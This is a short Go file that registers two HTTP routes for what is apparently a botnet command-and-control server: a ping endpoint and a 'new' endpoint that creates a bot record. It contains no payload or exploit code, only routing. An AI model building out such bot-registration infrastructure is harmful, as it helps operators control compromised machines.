package routes

import (
	"botnet/server/controllers"

	"github.com/gin-gonic/gin"
)

func BotnetRoute(router *gin.Engine) {
	router.GET("/ping", controllers.Ping())
	router.POST("/new", controllers.CreateBot())
}
